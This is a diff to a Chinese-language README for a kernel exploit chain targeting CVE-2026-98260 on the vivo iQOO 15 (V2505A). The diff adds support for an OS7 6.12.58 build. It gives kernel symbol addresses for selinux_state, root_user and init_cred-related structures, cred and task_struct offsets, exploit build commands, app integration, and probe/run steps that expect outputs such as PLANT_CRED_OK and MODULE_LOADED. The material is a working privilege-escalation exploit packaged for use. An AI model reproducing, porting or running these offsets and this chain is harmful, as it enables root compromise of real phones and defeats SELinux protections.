@@ -1,4 +1,4 @@
-# iQOO 15（V2505A）6.12.58 新 OS6 CVE-2026-98260 适配
+# iQOO 15（V2505A）6.12.58 OS6/OS7 CVE-2026-98260 适配
 
 在原有 **V2505A 链路**上新增一个 per-build profile；不是 6.12.69 的通用链。
 保留 V2505A 的 vivo `vr.ko` 处理、SUSFS 和 Dynamic Switching 接线，只替换
@@ -128,6 +128,55 @@ python3 recover.py kernel.bin      # kernel.bin = boot.img[0x1000 : 0x1000+kerne
   Dynamic Switching 使用现有 6.12 通用 loader/KO；新内核是 android16-6，
   比旧 V2505A 的 android16-5 更接近现有 6.12 模块，但仍需真机确认。
 
+## OS7 6.12.58（第二份 6.12.58 build）
+
+- 全量包：`https://sysuptxdl.vivo.com.cn/upgrade/oem/files/20261105053543df3dbd6f98071b0e38d9df5dab52b2b5.zip`
+- 包大小：11,975,446,095 字节；`payload.bin` 是 stored。
+- OTA metadata：`vivo/canoe/canoe:17/CP2A.260605.016/261104205930:user/release-keys`；
+  `post-version=PD2505_A_17.1.10.9.W10.V000L1`；`post-sdk-level=37`
+  （Android 17 / OS7）；`hardware-device=PD2505MA`。
+- boot 三段同样是 type 14 ZSTD：`data_offset/data_length` 为
+  `887854/12099921`、`12987775/1494350`、`14482125/1079`，dst_extents
+  `(0,8192)`、`(8192,8192)`、`(16384,8192)`。
+- `boot.img`：100,663,296 字节，SHA-256
+  `4557237b4eb31b31f62513fa9ac49c3090ff204230239359a97e55b44abc2a5f`
+- 内核 Image：41,306,624 字节，SHA-256
+  `fe2c8afae654d8b4f31bd4fe3c35ea9f642387b0fd191e8f83a1bf207f0c7337`
+- release：`6.12.58-android16-6-gdd6fd5c98918-abogki543627742-4k`
+
+### OS7 常量
+
+```c
+#define TARGET_KERNEL_RELEASE      "6.12.58-android16-6-gdd6fd5c98918-abogki543627742-4k"
+
+#define STATIC_TIMER_SITE          0xffffffc0805173e4ULL
+#define TIMER_SITE_LOW21           0x1173e4ULL
+#define COPY_PROCESS_LOW21         0x1f2218ULL
+#define SELINUX_STATE_STATIC       0xffffffc0827c6520ULL
+#define PANIC_ON_WARN_STATIC       0xffffffc08252afe0ULL
+#define SYS_EXIT_TRACEPOINT_STATIC 0xffffffc0826d93e0ULL
+#define TRACEPOINT_FUNCS_OFF       0x48ULL
+#define ROOT_USER_STATIC           0xffffffc082552958ULL
+#define INIT_USER_NS_STATIC        0xffffffc0825526e0ULL
+#define INIT_UCOUNTS_STATIC        0xffffffc0825542f0ULL
+#define INIT_GROUPS_STATIC         0xffffffc082553e20ULL
+```
+
+BTF/共享尺寸与 OS6 相同：k_itimer 0x100、task_struct 0x1440、`task->cred`
+0x900、cred 0xb8、tracepoint 0x50/funcs 0x48。`selinux_state` 和
+`panic_on_warn` 静态地址也与 OS6 相同；`root_user`/`init_*` 各 +0x10。
+
+### OS6 → OS7 的差异
+
+- 完整 release/build 不同；都是 6.12.58 android16-6。
+- timer site：`0x117cb8` → `0x1173e4`；copy site：`0x18da1c` → `0x1f2218`。
+- vr.ko tracepoint：`0x826d9360` → `0x826d93e0`；funcs 偏移仍 `0x48`。
+- root_user/init_user_ns/init_ucounts/init_groups 各 +0x10；selinux/panic 不变。
+- 共享结构尺寸、V2505A 链、SUSFS/通用切换、`rooted`/burst 修复全部复用。
+
+> OS7 内核的 kallsyms offsets 数组相对 relative_base 有 4 字节 pad；本目录的
+> `recover.py` 已改为在 base 附近扫描单调 s32 offsets 数组，OS6/OS7 都能复算。
+
 ## 构建
 
 ```bash
@@ -135,25 +184,32 @@ cd exploit/rust-t61269
 cargo build --release --target aarch64-linux-android --features v2505a_61258
 cp target/aarch64-linux-android/release/t61269 \
    ../../app/app/src/main/jniLibs/arm64-v8a/libv2505a_61258.so
+
+cargo build --release --target aarch64-linux-android --features v2505a_61258_os7
+cp target/aarch64-linux-android/release/t61269 \
+   ../../app/app/src/main/jniLibs/arm64-v8a/libv2505a_61258_os7.so
 ```
 
-`build.rs` 追加 `-DV2505A_61258`，`Cargo.toml` 对应 `v2505a_61258 = []`。
+`build.rs` 分别追加 `-DV2505A_61258` / `-DV2505A_61258_OS7`，
+`Cargo.toml` 对应 `v2505a_61258 = []` / `v2505a_61258_os7 = []`。
 
 ## App 侧
 
 - `ExploitKind.CVE2505A_61258("CVE-2026-98260-vivo-V2505A-6.12.58")`，按完整
-  release 精确选中
-- 入口：`nativeLibraryDir/libv2505a_61258.so run`
+  OS6 release 精确选中；入口 `libv2505a_61258.so`
+- `ExploitKind.CVE2505A_61258_OS7("CVE-2026-98260-vivo-V2505A-6.12.58-OS7")`，
+  按完整 OS7 release 精确选中；入口 `libv2505a_61258_os7.so`
 - 旧的 6.12.23 V2505A 入口保留，按各自完整内核版本选择
 - SUSFS / Dynamic Switching 与旧 V2505A 一致；VFS 仍只对 6.18 开放
 
 ## 验证顺序
 
-1. 只读自检：`libv2505a_61258.so probe` → 期望 `PROBE_KERNEL`、
-   `PROBE_TIMER ... low21=0x117cb8`、`PROBE_TASK ... low21=0x18da1c`、
-   `PROBE_SLIDE ... aligned=1`、`PROBE_LINEAR_MAP`、`PROBE_CRED`、
-   `PROBE_VR_TRACEPOINT=0x... funcs=0x... off=0x48`、`PROBE_OK`
-2. 完整链路：`libv2505a_61258.so run`，关注 `PLANT_CRED_OK` / `PARKED=1` /
+1. 只读自检：
+   - OS6：`libv2505a_61258.so probe` → `low21=0x117cb8` / `0x18da1c`
+   - OS7：`libv2505a_61258_os7.so probe` → `low21=0x1173e4` / `0x1f2218`
+   - 两者都期望 `PROBE_SLIDE ... aligned=1`、`PROBE_LINEAR_MAP`、`PROBE_CRED`、
+     `PROBE_VR_TRACEPOINT=0x... funcs=0x... off=0x48`、`PROBE_OK`
+2. 完整链路：对应 `.so run`，关注 `PLANT_CRED_OK` / `PARKED=1` /
    `MODULE_LOADED`
 3. 冷重启后再跑一次；再验证 SUSFS 与 Dynamic Switching
 4. 失败一律留 holder（`t61269-hold`），**同 boot 不要强行重跑**，冷重启再试
